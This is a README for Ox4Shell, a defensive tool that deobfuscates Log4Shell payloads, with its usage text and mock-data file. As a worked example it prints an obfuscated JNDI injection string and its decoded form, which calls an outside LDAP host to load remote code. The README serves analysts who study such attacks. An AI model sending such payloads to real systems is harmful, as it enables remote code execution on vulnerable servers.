# Ox4Shell
Deobfuscate Log4Shell payloads with ease.


## Description
Since the release of the Log4Shell vulnerability (CVE-...), many tools were created to obfuscate Log4Shell payloads,
making the lifes of security engineers a nightmare.

This tool intends to aid security enginners to unravel the true contents of obfuscated Log4Shell payloads.

For example, consider the following obfuscated payload:
```text
${zrch-Q(NGyN-yLkV:-}${j${sm:Eq9QDZ8-xEv54:-ndi}${GLX-MZK13n78y:GW2pQ:-:l}${ckX:2@BH[)]Tmw:a(:-da}${W(d:KSR)ky3:bv78UX2R-5MV:-p:/}/1.${)U:W9y=N:-}${i9yX1[:Z[Ve2=IkT=Z-96:-1.1}${[W*W:w@q.tjyo@-vL7thi26dIeB-HxjP:-.1}:38${Mh:n341x.Xl2L-8rHEeTW*=-lTNkvo:-90/}${sx3-9GTRv:-Cal}c$c${HR-ewA.mQ:g6@jJ:-z}3z${uY)u:7S2)P4ihH:M_S8fanL@AeX-PrW:-]}${S5D4[:qXhUBruo-QMr$1Bd-.=BmV:-}${_wjS:BIY0s:-Y_}p${SBKv-d9$5:-}Wx${Im:ajtV:-}AoL${=6wx-_HRvJK:-P}W${cR.1-lt3$R6R]x7-LomGH90)gAZ:NmYJx:-}h}
```

After running Ox4Shell, it would transform into an intuitive and readable form:
```text
${jndi:ldap://1.1.1.1:3890/Calc$cz3z]Y_pWxAoLPWh}
```


## Usage
To run the tool simply:
```
usage: ox4shell [-h] [-d] (-p PAYLOAD | -f FILE)

   ____       _  _   _____ _          _ _ 
  / __ \     | || | / ____| |        | | |
 | |  | |_  _| || || (___ | |__   ___| | |
 | |  | \ \/ /__   _\___ \| '_ \ / _ \ | |
 | |__| |>  <   | | ____) | | | |  __/ | |
  \____//_/\_\  |_||_____/|_| |_|\___|_|_|

Ox4Shell - Deobfuscate Log4Shell payloads with ease.
    Created by Oxeye.io

options:
  -h, --help            show this help message and exit
  -d, --debug           Enable debug mode
  -p PAYLOAD, --payload PAYLOAD
                        The payload to deobfuscate
  -f FILE, --file FILE  A file containing payloads
```


## Mock Data
Ox4Shell uses the `mock.json` file to insert common values into certain lookup function, for example,
if the payload contains the value `${env:HOME}`, we can replace it with a custom mock value.

For example, the default set of mock data provided is:
```json
{
    "hostname": "ip-172-30-20-110",
    "env": {
        "aws_profile": "staging",
        "user": "ubuntu",
        "pwd": "/opt/",
        "path": "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/jvm/java-1.8-openjdk/jre/bin:/usr/lib/jvm/java-1.8-openjdk/bin"
    },
    "sys": {
        "java.version": "16.0.2",
        "user.name": "ubuntu"
    },
    "java": {
        "version": "Java version 16.0.2",
        "os": "Linux 5.10.47-linuxkit unknown, architecture: amd64-64"
    }
}
```

## Authors
- [Daniel Abeles](https://twitter.com/Daniel_Abeles)
- [Ron Vider](https://twitter.com/ron_vider)


## License
The source code for the site is licensed under the MIT license, which you can find in the LICENSE file.
